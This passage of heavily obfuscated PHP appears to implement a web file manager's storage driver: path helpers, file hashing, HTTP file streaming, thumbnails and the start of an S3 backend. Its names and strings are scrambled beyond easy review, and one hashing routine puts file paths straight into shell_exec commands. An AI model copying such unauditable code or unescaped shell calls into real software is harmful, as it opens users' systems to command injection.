$âƒÌ™İÌ = $º®÷ïæ <= $™áˆ±§­ ? $Ì™«ÊøÌ[92] : $Ì™«ÊøÌ[93]; $ğûõ³Ñ = (!$º®÷ïæ ? 1 : ceil($º®÷ïæ / pow(1024, 3))) * 3600 * 4; $ïó›ã¸ = $this->{$âƒÌ™İÌ}($—ÍÅ± û, $ğûõ³Ñ); if ($ïó›ã¸) { $ïó›ã¸[$Ì™«ÊøÌ[94]] = $—ÍÅ± û; $ïó›ã¸[$Ì™«ÊøÌ[95]] = $¢Š×¾øĞ; } return $ïó›ã¸; } public function uploadFormData($Æ„¥˜‚¦, $òöÌÒÍ¹ = 3600) { } public function multiUploadFormData($ƒ×š®©¤, $‚¤•ÅÚ£ = 3600) { } public function download($•ßëìõÂ, $¸Òú³İ¾) { } public function ext($ŠœÈğÊ‚) { $Š³¿û¡¿ =& $_SERVER[­õöî’–]; if (strpos($ŠœÈğÊ‚, $Š³¿û¡¿[8]) === -1) { $““¾“œ = $ŠœÈğÊ‚; } else { $““¾“œ = $this->pathThis($ŠœÈğÊ‚); } $ñª®«ó¸ = $Š³¿û¡¿[12]; if (strstr($““¾“œ, $Š³¿û¡¿[10])) { $ñª®«ó¸ = substr($““¾“œ, strrpos($““¾“œ, $Š³¿û¡¿[10]) + 1); $ñª®«ó¸ = strtolower($ñª®«ó¸); } if (strlen($ñª®«ó¸) > 3 && preg_match($Š³¿û¡¿[96], $ñª®«ó¸, $µ­¿«‰)) { $ñª®«ó¸ = $Š³¿û¡¿[12]; } return $ñª®«ó¸; } public function pathThis($´ôÎ‚¬¾) { $èÒÎîóô =& $_SERVER[­õöî’–]; $´ôÎ‚¬¾ = str_replace($èÒÎîóô[97], $èÒÎîóô[8], rtrim($´ôÎ‚¬¾, $èÒÎîóô[8])); $†ÒÙ²“Ø = strrpos($´ôÎ‚¬¾, $èÒÎîóô[8]); if ($†ÒÙ²“Ø === !1) { return $´ôÎ‚¬¾; } return substr($´ôÎ‚¬¾, $†ÒÙ²“Ø + 1); } public function pathFather($œ Â§‹Ú) { $•Éò»í =& $_SERVER[­õöî’–]; $œ Â§‹Ú = str_replace($•Éò»í[97], $•Éò»í[8], rtrim($œ Â§‹Ú, $•Éò»í[8])); $ÉËŒàŞì = strrpos($œ Â§‹Ú, $•Éò»í[8]); if ($ÉËŒàŞì === !1) { return $•Éò»í[12]; } return substr($œ Â§‹Ú, 0, $ÉËŒàŞì + 1); } public function hashSimple($ë¬´Û”Ñ) { $©ÇÓ¡™÷ =& $_SERVER[­õöî’–]; if (!$ë¬´Û”Ñ) { return md5($©ÇÓ¡™÷[12]); } $Šë´¼¬Ü = $this->size($ë¬´Û”Ñ); $¼Á°ŞìÉ = 200; $Ó–ÌÚÉ× = 50; if ($Šë´¼¬Ü <= $¼Á°ŞìÉ * $Ó–ÌÚÉ×) { return $this->hashMd5($ë¬´Û”Ñ) . $Šë´¼¬Ü; } $Êä±‘¬´ = intval($Šë´¼¬Ü / $Ó–ÌÚÉ×); $‹À‚Ùåˆ = $©ÇÓ¡™÷[12]; for ($ì½²³… = 0; $ì½²³… < $Ó–ÌÚÉ×; $ì½²³…++) { $‹À‚Ùåˆ .= $this->fileSubstr($ë¬´Û”Ñ, $Êä±‘¬´ * $ì½²³…, $¼Á°ŞìÉ); } $‹À‚Ùåˆ .= $this->fileSubstr($ë¬´Û”Ñ, $Šë´¼¬Ü - $¼Á°ŞìÉ, $¼Á°ŞìÉ); return md5($‹À‚Ùåˆ) . $Šë´¼¬Ü; } public static $md5Cache = array(); public function hashMd5($Ê±ú•ù·) { if (!$Ê±ú•ù·) { return md5($_SERVER[­õöî’–][12]); } $Ê±ú•ù· = $this->iconvSystem($Ê±ú•ù·); if (isset(self::$md5Cache[$Ê±ú•ù·])) { return self::$md5Cache[$Ê±ú•ù·]; } self::$md5Cache[$Ê±ú•ù·] = $this->hashMd5Shell($Ê±ú•ù·); if (!self::$md5Cache[$Ê±ú•ù·]) { self::$md5Cache[$Ê±ú•ù·] = @md5_file($Ê±ú•ù·); } return self::$md5Cache[$Ê±ú•ù·]; } private function hashMd5Shell($¶Ù¼ùÇÌ) { $£ã¢ï§Ë =& $_SERVER[­õöî’–]; if (!$¶Ù¼ùÇÌ) { return md5($£ã¢ï§Ë[12]); } if (!function_exists($£ã¢ï§Ë[98])) { return !1; } $©£½Åç = array($£ã¢ï§Ë[99], $£ã¢ï§Ë[100]); $¯«Ò÷¡“ = Cache::get($£ã¢ï§Ë[101]); if (!$¯«Ò÷¡“) { $åàã€½Ş = BASIC_PATH . $£ã¢ï§Ë[102]; $÷Ğ¥ÒªÙ = md5_file($åàã€½Ş); $¯«Ò÷¡“ = $£ã¢ï§Ë[103]; foreach ($©£½Åç as $Ä§è†å) { $¸‘ÚÁ = shell_exec($Ä§è†å . "\x20\42{$åàã€½Ş}\x22"); if ($¸‘ÚÁ && substr(trim($¸‘ÚÁ), 0, 32) == $÷Ğ¥ÒªÙ) { $¯«Ò÷¡“ = $Ä§è†å; break; } } Cache::set($£ã¢ï§Ë[101], $¯«Ò÷¡“, 3600); } if ($¯«Ò÷¡“ == $£ã¢ï§Ë[103]) { return !1; } $¸‘ÚÁ = shell_exec($¯«Ò÷¡“ . "\x20\42{$¶Ù¼ùÇÌ}\42"); $¸‘ÚÁ = str_replace($£ã¢ï§Ë[104], $£ã¢ï§Ë[12], $¸‘ÚÁ); return substr($¸‘ÚÁ, 0, 32); } public function link($Œ¹®ˆÀü) { return $Œ¹®ˆÀü; } public function fileOut($®»­¨ù©, $Ô»Ç‰³  = false, $ˆİ€İŞ… = false, $ö™²üÈÛ = '') { $”İ÷Ö¡ =& $_SERVER[­õöî’–]; $this->cacheMethod(null, null); if (!$®»­¨ù© || !$this->exist($®»­¨ù©)) { show_json(LNG($”İ÷Ö¡[105]), !1, $ˆİ€İŞ…); } $‘‰êìîš = $this->getType() == $”İ÷Ö¡[106]; $‡™àÕô… = $GLOBALS[$”İ÷Ö¡[6]][$”İ÷Ö¡[89]][$”İ÷Ö¡[107]][$”İ÷Ö¡[108]]; $Œ”›õ™ = (double) $GLOBALS[$”İ÷Ö¡[6]][$”İ÷Ö¡[89]][$”İ÷Ö¡[107]][$”İ÷Ö¡[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $åÙ°œê‰ = $this->infoFull($®»­¨ù©); $ñ‘ğúæ˜ = $åÙ°œê‰[$”İ÷Ö¡[76]]; $ö”¿Î´ò = gmdate($”İ÷Ö¡[110], $åÙ°œê‰[$”İ÷Ö¡[85]]); $êø¶§‘ = $ˆİ€İŞ… ? $ˆİ€İŞ… : $this->iconvApp($åÙ°œê‰[$”İ÷Ö¡[32]]); $‘ßßã«‘ = 0; $øöúÖ±¤ = $ñ‘ğúæ˜ - 1; $¹áœÕ·À = $this->ext($êø¶§‘); if (in_array($¹áœÕ·À, array($”İ÷Ö¡[111], $”İ÷Ö¡[112], $”İ÷Ö¡[113], $”İ÷Ö¡[114]))) { $¹áœÕ·À = $”İ÷Ö¡[115]; } if (in_array($¹áœÕ·À, array($”İ÷Ö¡[116]))) { $¹áœÕ·À = $”İ÷Ö¡[117]; } if (!$ö™²üÈÛ) { $ö™²üÈÛ = md5($ö”¿Î´ò . $this->hashSimple($®»­¨ù©)); } $ö™²üÈÛ = $”İ÷Ö¡[118] . $ö™²üÈÛ . $”İ÷Ö¡[118]; $‚Œä™¡Ì = get_file_mime($¹áœÕ·À); $·–Ùöâ = !0; $·–Ùöâ = isset($_GET[$”İ÷Ö¡[119]]) ? !1 : !0; if ($Ô»Ç‰³  === !1 && !mime_support($‚Œä™¡Ì)) { $‚Œä™¡Ì = $”İ÷Ö¡[120]; } header($”İ÷Ö¡[121]); header($”İ÷Ö¡[122] . $‚Œä™¡Ì); $‰ƒÛ²Ü = rawurlencode($êø¶§‘); $‰ƒÛ²Ü = $”İ÷Ö¡[118] . $‰ƒÛ²Ü . $”İ÷Ö¡[123] . $‰ƒÛ²Ü; if ($Ô»Ç‰³ ) { header($”İ÷Ö¡[124]); header($”İ÷Ö¡[125] . $‰ƒÛ²Ü); } else { if ($·–Ùöâ) { header($”İ÷Ö¡[126] . $‰ƒÛ²Ü); } } header($”İ÷Ö¡[127] . gmdate($”İ÷Ö¡[110], time() + 3600 * 24 * 30) . $”İ÷Ö¡[128]); header($”İ÷Ö¡[129]); header($”İ÷Ö¡[130]); header($”İ÷Ö¡[131]); if (isset($_SERVER[$”İ÷Ö¡[132]]) && strtotime($_SERVER[$”İ÷Ö¡[132]]) == $åÙ°œê‰[$”İ÷Ö¡[85]]) { header($”İ÷Ö¡[133], !0, 304); die; } if (isset($_SERVER[$”İ÷Ö¡[134]]) && $_SERVER[$”İ÷Ö¡[134]] == $ö™²üÈÛ) { header($”İ÷Ö¡[135] . $ö™²üÈÛ, !0, 304); die; } header($”İ÷Ö¡[135] . $ö™²üÈÛ); header($”İ÷Ö¡[136] . $ö”¿Î´ò . $”İ÷Ö¡[128]); header($”İ÷Ö¡[137] . $êø¶§‘); header($”İ÷Ö¡[138]); header($”İ÷Ö¡[139] . $ñ‘ğúæ˜); header($”İ÷Ö¡[140]); if (!$Ô»Ç‰³  && $¹áœÕ·À == $”İ÷Ö¡[141]) { if ($ñ‘ğúæ˜ > 1024 * 1024 * 5) { die; } $İõÀ’ù = $this->getContent($®»­¨ù©); $İõÀ’ù = Html::clearSVG($İõÀ’ù); header($”İ÷Ö¡[142] . strlen($İõÀ’ù)); echo $İõÀ’ù; die; } $ıÃñãÙó = strtolower($_SERVER[$”İ÷Ö¡[143]]); if ($‘‰êìîš && $ıÃñãÙó && $‡™àÕô…) { if (strstr($ıÃñãÙó, $”İ÷Ö¡[144])) { header($”İ÷Ö¡[145] . $®»­¨ù©); } else { if (strstr($ıÃñãÙó, $”İ÷Ö¡[146])) { header($”İ÷Ö¡[147] . $®»­¨ù©); } else { if (strstr($ıÃñãÙó, $”İ÷Ö¡[148])) { header($”İ÷Ö¡[149] . $®»­¨ù©); } } } if ($Œ”›õ™) { header($”İ÷Ö¡[150] . $Œ”›õ™); } return; } if (isset($_SERVER[$”İ÷Ö¡[151]])) { if (preg_match($”İ÷Ö¡[152], $_SERVER[$”İ÷Ö¡[151]], $Ê©£•±£)) { $‘ßßã«‘ = intval($Ê©£•±£[1]); $‘ßßã«‘ = $‘ßßã«‘ <= 0 ? 0 : ($‘ßßã«‘ >= $øöúÖ±¤ ? $øöúÖ±¤ : $‘ßßã«‘); if (!empty($Ê©£•±£[2])) { $„Ê åôÀ = intval($Ê©£•±£[2]); $øöúÖ±¤ = $„Ê åôÀ < $‘ßßã«‘ ? $‘ßßã«‘ : ($„Ê åôÀ >= $øöúÖ±¤ ? $øöúÖ±¤ : $„Ê åôÀ); } } header($”İ÷Ö¡[153]); header("\103\x6f\x6e\x74\145\156\164\55\x52\x61\156\147\x65\72\x20\142\171\x74\145\163\40{$‘ßßã«‘}\55{$øöúÖ±¤}\x2f" . $ñ‘ğúæ˜); } else { header($”İ÷Ö¡[154]); } header($”İ÷Ö¡[155]); $´áÒÓÇ— = !0; if ($_SERVER[$”İ÷Ö¡[156]] == $”İ÷Ö¡[157] && $ñ‘ğúæ˜ > 1204 * 1024 * 1024 * 2) { $´áÒÓÇ— = !1; } if ($´áÒÓÇ—) { header($”İ÷Ö¡[158] . ($øöúÖ±¤ - $‘ßßã«‘ + 1)); } if ($_SERVER[$”İ÷Ö¡[159]] == $”İ÷Ö¡[160]) { return; } $©¤È§– = 1024 * 100; $Şã–Š— = 0; if ($Œ”›õ™) { $Şã–Š— = intval(1000 * 1000 * ($©¤È§– / $Œ”›õ™)); } while ($‘ßßã«‘ <= $øöúÖ±¤) { $¬—˜ä¢ = timeFloat(); check_abort(); $éëÇ×Ğ = $øöúÖ±¤ - $‘ßßã«‘ + 1; if ($éëÇ×Ğ <= $©¤È§–) { $©¤È§– = $éëÇ×Ğ; } echo $this->fileSubstr($®»­¨ù©, $‘ßßã«‘, $©¤È§–); $‘ßßã«‘ += $©¤È§–; if ($©¤È§– == $éëÇ×Ğ) { $‘ßßã«‘ = $øöúÖ±¤ + 1; } if ($Şã–Š—) { $’•ºäŠ¶ = intval(1000 * 1000 * (timeFloat() - $¬—˜ä¢)); $Ÿİİñ™¿ = $Şã–Š— - $’•ºäŠ¶; if ($Ÿİİñ™¿ > 5) { usleep($Ÿİİñ™¿); } } } } public function fileOutServer($İ‰ß¼ó“, $ÈÂ›á = false, $»û“¾‹ = false, $‡§³æ½‰ = '') { $this->fileOut($İ‰ß¼ó“, $ÈÂ›á, $»û“¾‹, $‡§³æ½‰); } public function fileOutLink($¼ÑÏ‘œâ) { header($_SERVER[­õöî’–][161] . $¼ÑÏ‘œâ); die; } public function cacheMethod($Ûàõïú„, $…ûÚá, $Œ¤œ›ÈÃ = null) { $ÔîêŸÃ¢ =& $_SERVER[­õöî’–]; static $§Òñ = array(); $ ÛªÉŸ = $…ûÚá ? ltrim($this->getPathOuter($…ûÚá), $ÔîêŸÃ¢[8]) : $ÔîêŸÃ¢[12]; $‘¶îĞ = $ÔîêŸÃ¢[162] . $Ûàõïú„ . $ÔîêŸÃ¢[163] . rtrim($ ÛªÉŸ, $ÔîêŸÃ¢[8]); if (is_null($Ûàõïú„)) { $§Òñ = array(); return; } if (is_null($…ûÚá)) { foreach ($§Òñ as $‘¶îĞ => $³ˆ©û¯) { if (!strstr($‘¶îĞ, $ÔîêŸÃ¢[162] . $Ûàõïú„ . $ÔîêŸÃ¢[164])) { continue; } unset($§Òñ[$‘¶îĞ]); } return; } if (!is_null($Œ¤œ›ÈÃ)) { $§Òñ[$‘¶îĞ] = $Œ¤œ›ÈÃ; return; } $é•ñ¥ = isset($§Òñ[$‘¶îĞ]) ? $§Òñ[$‘¶îĞ] : null; if (!is_null($é•ñ¥)) { return $é•ñ¥; } $é•ñ¥ = $this->{$Ûàõïú„}($…ûÚá); $§Òñ[$‘¶îĞ] = $é•ñ¥; return $é•ñ¥; } public function cacheMethodInfoSet($î¿£ÍİÂ, $­Ÿƒ×§, $”ğ…ƒØ = false) { $ÔÑƒŠ‰Ğ =& $_SERVER[­õöî’–]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÔÑƒŠ‰Ğ[165], $î¿£ÍİÂ, $­Ÿƒ×§); $this->cacheMethod($ÔÑƒŠ‰Ğ[166], $î¿£ÍİÂ, $­Ÿƒ×§ ? !1 : !0); if (is_array($”ğ…ƒØ)) { $this->cacheMethod($ÔÑƒŠ‰Ğ[167], $î¿£ÍİÂ, $”ğ…ƒØ); } } public function fileOutImage($ŸÖÉé”, $ ¢¶ÁË‘ = 250) { $«·Ó·ÔÌ =& $_SERVER[­õöî’–]; set_timeout(); if (substr($ŸÖÉé”, 0, 4) == $«·Ó·ÔÌ[148]) { $this->fileOutLink($ŸÖÉé”); } $»ç‡ƒÇÚ = $this->info($ŸÖÉé”); $Íü¥ĞŒÜ = $»ç‡ƒÇÚ[$«·Ó·ÔÌ[32]]; $†¼ßı·  = !1; if (isset($GLOBALS[$«·Ó·ÔÌ[168]]) && $GLOBALS[$«·Ó·ÔÌ[168]][$«·Ó·ÔÌ[84]] == $»ç‡ƒÇÚ[$«·Ó·ÔÌ[84]]) { $Ş»çÄî¼ = $GLOBALS[$«·Ó·ÔÌ[168]][$«·Ó·ÔÌ[169]]; if (!$»ç‡ƒÇÚ[$«·Ó·ÔÌ[170]]) { $»ç‡ƒÇÚ[$«·Ó·ÔÌ[170]] = $GLOBALS[$«·Ó·ÔÌ[168]]; } if (isset($Ş»çÄî¼[$«·Ó·ÔÌ[171]])) { if ($Ş»çÄî¼[$«·Ó·ÔÌ[171]] <= $ ¢¶ÁË‘ && $Ş»çÄî¼[$«·Ó·ÔÌ[172]] <= $ ¢¶ÁË‘) { $†¼ßı·  = !0; } } $Íü¥ĞŒÜ = $»ç‡ƒÇÚ[$«·Ó·ÔÌ[170]][$«·Ó·ÔÌ[32]]; } if ($»ç‡ƒÇÚ[$«·Ó·ÔÌ[76]] <= 1024 * 50 || $†¼ßı·  || !function_exists($«·Ó·ÔÌ[173]) || $»ç‡ƒÇÚ[$«·Ó·ÔÌ[174]] == $«·Ó·ÔÌ[175]) { return $this->fileOut($ŸÖÉé”, !1, $Íü¥ĞŒÜ); } if (isset($»ç‡ƒÇÚ[$«·Ó·ÔÌ[170]][$«·Ó·ÔÌ[176]])) { $´‘¤„†Ş = $»ç‡ƒÇÚ[$«·Ó·ÔÌ[170]][$«·Ó·ÔÌ[176]]; } else { if (isset($»ç‡ƒÇÚ[$«·Ó·ÔÌ[170]][$«·Ó·ÔÌ[177]])) { $´‘¤„†Ş = $»ç‡ƒÇÚ[$«·Ó·ÔÌ[170]][$«·Ó·ÔÌ[177]]; } } if (!$´‘¤„†Ş) { $´‘¤„†Ş = md5("{$»ç‡ƒÇÚ[$«·Ó·ÔÌ[32]]}\x5f{$»ç‡ƒÇÚ[$«·Ó·ÔÌ[84]]}\137{$»ç‡ƒÇÚ[$«·Ó·ÔÌ[76]]}\137{$ ¢¶ÁË‘}"); } $üì¿ Æß = "{$´‘¤„†Ş}\137{$ ¢¶ÁË‘}\x2e\160\156\147"; if (!($¼¬¬ã¥” = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $«·Ó·ÔÌ[178]))) { $‘õŞÉ’Ò = IO::mkdir(IO_PATH_SYSTEM_TEMP . $«·Ó·ÔÌ[179]); } else { $‘õŞÉ’Ò = KodIO::make($¼¬¬ã¥”); } if ($¼¬¬ã¥” = IO::fileNameExist($‘õŞÉ’Ò, $üì¿ Æß)) { $¬ÃÍüõ = KodIO::make($¼¬¬ã¥”); return IO::fileOut($¬ÃÍüõ, !1, $Íü¥ĞŒÜ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $¬ÃÍüõ = DATA_THUMB . $üì¿ Æß; del_file($¬ÃÍüõ); if (!@file_exists($¬ÃÍüõ)) { $ÄóÅ€  = TEMP_FILES; if (!is_dir($ÄóÅ€ )) { mk_dir($ÄóÅ€ ); } $Ã±ëŒ¤ğ = $ÄóÅ€  . $´‘¤„†Ş . $«·Ó·ÔÌ[10] . $»ç‡ƒÇÚ[$«·Ó·ÔÌ[174]]; if (!@file_exists($Ã±ëŒ¤ğ)) { $Ã±ëŒ¤ğ = $this->download($ŸÖÉé”, $Ã±ëŒ¤ğ); } ImageThumb::createThumb($Ã±ëŒ¤ğ, $¬ÃÍüõ, $ ¢¶ÁË‘, $ ¢¶ÁË‘ * 10); } if (!file_exists($¬ÃÍüõ) || filesize($¬ÃÍüõ) < 100) { return @file_exists($Ã±ëŒ¤ğ) ? IO::fileOut($Ã±ëŒ¤ğ) : $this->fileOut($ŸÖÉé”); } if (!($˜—ôö§ø = IO::move($¬ÃÍüõ, $‘õŞÉ’Ò))) { return IO::fileOut($¬ÃÍüõ); } del_file($¬ÃÍüõ); IO::fileOut($˜—ôö§ø); } public function fileOutImageServer($›Ò¢‰÷ğ, $–Ÿãã™† = 250) { $this->fileOutImage($›Ò¢‰÷ğ, $–Ÿãã™†); } public function fileNameAuto($ÂÅ÷Å«Ì, $¦®ıÑã, $Ğ¸ôàª¿ = REPEAT_RENAME, $†‘´ÇØú = false) { $Âõö·‹ =& $_SERVER[­õöî’–]; $÷¨¯ÂØ = $ÂÅ÷Å«Ì === $Âõö·‹[12] ? $¦®ıÑã : rtrim($ÂÅ÷Å«Ì, $Âõö·‹[8]) . $Âõö·‹[8] . $¦®ıÑã; if ($Ğ¸ôàª¿ == REPEAT_REPLACE || !$this->exist($÷¨¯ÂØ) || $†‘´ÇØú && $Ğ¸ôàª¿ != REPEAT_RENAME_FOLDER) { return $¦®ıÑã; } if ($Ğ¸ôàª¿ == REPEAT_SKIP) { return !1; } $ÁÃğˆ†í = $Âõö·‹[10] . get_path_ext($¦®ıÑã); $ÁÃğˆ†í = $ÁÃğˆ†í == $Âõö·‹[10] || $†‘´ÇØú ? $Âõö·‹[12] : $ÁÃğˆ†í; $Ø¸ûªŸĞ = 1; $šö¶áê² = substr($¦®ıÑã, 0, strlen($¦®ıÑã) - strlen($ÁÃğˆ†í)); $Œõóœ¥× = $šö¶áê² . "\50{$Ø¸ûªŸĞ}\x29{$ÁÃğˆ†í}"; while ($this->exist(rtrim($ÂÅ÷Å«Ì, $Âõö·‹[8]) . $Âõö·‹[8] . $Œõóœ¥×)) { $Œõóœ¥× = $šö¶áê² . "\x28{$Ø¸ûªŸĞ}\x29{$ÁÃğˆ†í}"; $Ø¸ûªŸĞ++; } return $Œõóœ¥×; } private function fileNameAutoList($¦¹¾—, $è×ÛúÌ°, $¤ƒ£Êïƒ = false) { $ê»÷Şˆ =& $_SERVER[­õöî’–]; $À“æ©­› = $this->listPath($¦¹¾—, !0); $À“æ©­› = array_merge($À“æ©­›[$ê»÷Şˆ[82]], $À“æ©­›[$ê»÷Şˆ[83]]); $Éı…“Ã = array_to_keyvalue($À“æ©­›, $ê»÷Şˆ[12], $ê»÷Şˆ[32]); $¸§æá™‚ = $ê»÷Şˆ[10] . get_path_ext($è×ÛúÌ°); $¸§æá™‚ = $¸§æá™‚ == $ê»÷Şˆ[10] || $¤ƒ£Êïƒ ? $ê»÷Şˆ[12] : $¸§æá™‚; $İéÄÛÅ = substr($è×ÛúÌ°, 0, strlen($è×ÛúÌ°) - strlen($¸§æá™‚)); $ÒôôñÁ÷ = $İéÄÛÅ . "\50\x30\51{$¸§æá™‚}"; for ($ÚÕÊ”úó = 1; $ÚÕÊ”úó <= count($Éı…“Ã) + 1; $ÚÕÊ”úó++) { $ÒôôñÁ÷ = $İéÄÛÅ . "\x28{$ÚÕÊ”úó}\x29{$¸§æá™‚}"; if (!in_array_not_case($ÒôôñÁ÷, $Éı…“Ã)) { return $ÒôôñÁ÷; } } return $ÒôôñÁ÷; } public function listAllFiles($ÚÊîºğÕ, $¶Ã®Ìí›, $âªí°Àì = array()) { $ÄÔ¹¯ø =& $_SERVER[­õöî’–]; if (empty($¶Ã®Ìí›)) { return array(); } $¤ÃƒÔº¸ = array(); $ÚÊîºğÕ = trim($ÚÊîºğÕ, $ÄÔ¹¯ø[8]); foreach ($¶Ã®Ìí› as $øğâç¼ó) { $ó²ë¥†Ñ = ltrim(substr(trim($øğâç¼ó, $ÄÔ¹¯ø[8]), strlen($ÚÊîºğÕ)), $ÄÔ¹¯ø[8]); $¤ÃƒÔº¸ = array_merge($¤ÃƒÔº¸, $this->slicePath($ó²ë¥†Ñ)); } $ä¼¸“• = array(); foreach (array_unique($¤ÃƒÔº¸) as $øğâç¼ó) { $û¥•í½² = array($ÄÔ¹¯ø[84] => $this->getPathOuter($ÄÔ¹¯ø[8] . $ÚÊîºğÕ . $ÄÔ¹¯ø[8] . $øğâç¼ó), $ÄÔ¹¯ø[75] => 1, $ÄÔ¹¯ø[76] => 0); if (substr($øğâç¼ó, -1) != $ÄÔ¹¯ø[8]) { $û¥•í½²[$ÄÔ¹¯ø[75]] = 0; $Ç³óßùŸ = $this->getPath($ÚÊîºğÕ . $ÄÔ¹¯ø[8] . $øğâç¼ó); $û¥•í½²[$ÄÔ¹¯ø[76]] = isset($âªí°Àì[$Ç³óßùŸ]) ? $âªí°Àì[$Ç³óßùŸ] : $this->size($Ç³óßùŸ); } $ä¼¸“•[] = $û¥•í½²; } return $ä¼¸“•; } public function slicePath($Ç‚´¹ú) { $ú­œ÷íÔ =& $_SERVER[­õöî’–]; $Ûİ¹Ú™õ = explode($ú­œ÷íÔ[8], trim($Ç‚´¹ú, $ú­œ÷íÔ[8])); $áœóÄŞ£ = 0; do { ++$áœóÄŞ£; $ÏØ¹¥Øò[] = implode($ú­œ÷íÔ[8], array_slice($Ûİ¹Ú™õ, 0, $áœóÄŞ£)) . $ú­œ÷íÔ[8]; } while ($áœóÄŞ£ < count($Ûİ¹Ú™õ)); $ÏØ¹¥Øò[count($Ûİ¹Ú™õ) - 1] = $Ç‚´¹ú; return $ÏØ¹¥Øò; } public function getHost() { $ø§È˜‰ğ =& $_SERVER[­õöî’–]; $“ÎşÀñ¹ = parse_url(trim($this->domain, $ø§È˜‰ğ[8])); $ûò×¥›´ = isset($“ÎşÀñ¹[$ø§È˜‰ğ[180]]) ? $“ÎşÀñ¹[$ø§È˜‰ğ[180]] : http_type(); $ä¸üİ¨‘ = isset($“ÎşÀñ¹[$ø§È˜‰ğ[181]]) ? $“ÎşÀñ¹[$ø§È˜‰ğ[181]] : $“ÎşÀñ¹[$ø§È˜‰ğ[84]]; if (isset($“ÎşÀñ¹[$ø§È˜‰ğ[182]])) { $ä¸üİ¨‘ .= $ø§È˜‰ğ[4] . $“ÎşÀñ¹[$ø§È˜‰ğ[182]]; } return $ûò×¥›´ . $ø§È˜‰ğ[183] . $ä¸üİ¨‘; } public function pathEncode($¼œêãåî) { $Õ¾ˆ¿İ” =& $_SERVER[­õöî’–]; return str_replace($Õ¾ˆ¿İ”[184], $Õ¾ˆ¿İ”[8], rawurlencode($¼œêãåî)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($¶Ë¥êÛ) { set_timeout(); require_once SDK_DIR . $_SERVER[­õöî’–][185]; parent::__construct(); $this->_init($¶Ë¥êÛ); } public function _init($‰í”«) { foreach ($‰í”« as $¹ñ¦ñˆï => $˜ÖƒŠıæ) { if (isset($this->{$¹ñ¦ñˆï})) { $this->{$¹ñ¦ñˆï} = $˜ÖƒŠıæ; } } $this->endpoint = $‰í”«[$_SERVER[­õöî’–][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($÷ŒØêÚİ = "\x76\64") { $this->signVer = $÷ŒØêÚİ; $this->client->setSignatureVersion($÷ŒØêÚİ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $âÜ›‰­É =& $_SERVER[­õöî’–]; $È›Óâää = $this->getBucketCors(); if (!$È›Óâää || !is_array($È›Óâää)) { return !1; } if ($È›Óâää[$âÜ›‰­É[187]] != $âÜ›‰­É[188] || $È›Óâää[$âÜ›‰­É[189]] != $âÜ›‰­É[188]) { return !1; } $Ù°©Å†ˆ = array_map($âÜ›‰­É[190], $È›Óâää[$âÜ›‰­É[191]]); if (!is_array($Ù°©Å†ˆ)) { $Ù°©Å†ˆ = array(); } $éÖÎäÁœ = array($âÜ›‰­É[192], $âÜ›‰­É[193], $âÜ›‰­É[194], $âÜ›‰­É[195], $âÜ›‰­É[196]); $†ãØõìÏ = array_diff($éÖÎäÁœ, $Ù°©Å†ˆ); return empty($†ãØõìÏ); } public function mkfile($ü×È˜È’, $Ó»“®œ’ = '', $ƒ’…¯ÙŒ = REPEAT_RENAME) { $Çß©‘€™ = $this->setContent($ü×È˜È’, $Ó»“®œ’); if ($Çß©‘€™ !== !1) { return $this->getPathOuter($ü×È˜È’); } return !1; } public function mkdir($‚ù™Ë°å, $…Œ××´ê = REPEAT_SKIP) { $Áí‚…ı• =& $_SERVER[­õöî’–]; if (empty($‚ù™Ë°å) && $‚ù™Ë°å !== $Áí‚…ı•[197]) { return !1; } if ($…Œ××´ê && $this->_isFolder($‚ù™Ë°å)) { return $this->getPathOuter($‚ù™Ë°å); } $ó¦Äàè’ = $this->setContent($‚ù™Ë°å, $Áí‚…ı•[12], !0); if ($ó¦Äàè’ !== !1) { return $this->getPathOuter($‚ù™Ë°å); } return !1; } public function copyFile($…´›ÕæÀ, $Œ·†¨‘à, $ÂŒø…€« = array()) { $¼˜˜ÖÎÌ =& $_SERVER[­õöî’–]; $™¹áà¤ = $this->objectMeta($…´›ÕæÀ); if (!$™¹áà¤) { return !1; } if ($™¹áà¤[$¼˜˜ÖÎÌ[76]] <= 1024 * 1024 * 200) { $–Æğ›õ = $this->client->copyObject($this->bucket, $…´›ÕæÀ, $this->bucket, $Œ·†¨‘à, $¼˜˜ÖÎÌ[198], $ÂŒø…€«); } else { $–Æğ›õ = $this->client->multiCopyObject($this->bucket, $…´›ÕæÀ, $this->bucket, $Œ·†¨‘à, $ÂŒø…€«); } $–Æğ›õ = $–Æğ›õ ? $this->getPathOuter($Œ·†¨‘à) : !1; return $–Æğ›õ; } public function moveFile($â»­¶÷ú, $†É­’­) { if ($this->copyFile($â»­¶÷ú, $†É­’­)) { $this->delFile($â»­¶÷ú); return $this->getPathOuter($†É­’­); } return !1; } public function delFile($È¾–â¼÷) { return $this->client->deleteObject($this->bucket, $È¾–â¼÷); } public function delFolder($€ ãˆ‘¼) { $„˜Ê÷³ =& $_SERVER[­õöî’–]; if (!$this->exist($€ ãˆ‘¼)) { return !0; } $this->listItemCache = !1; $ğëÛÆÖí = $this->fileList($€ ãˆ‘¼); $this->listItemCache = !0; $¸±ª°ó = trim($€ ãˆ‘¼, $„˜Ê÷³[8]) . $„˜Ê÷³[8]; if (!empty($€ ãˆ‘¼) && $€ ãˆ‘¼ !== $„˜Ê÷³[197] && !in_array($¸±ª°ó, $ğëÛÆÖí[$„˜Ê÷³[82]])) { $ğëÛÆÖí[$„˜Ê÷³[82]][] = $¸±ª°ó; } $øßğ¢‡ = $this->delByBatch($ğëÛÆÖí[$„˜Ê÷³[83]]); if (!$øßğ¢‡) { return !1; } $øßğ¢‡ = $this->delByBatch($ğëÛÆÖí[$„˜Ê÷³[82]]); if (!$øßğ¢‡) { return !1; } return $this->delFile($¸±ª°ó); } private function delByBatch($˜ò˜§ÂÇ) { foreach 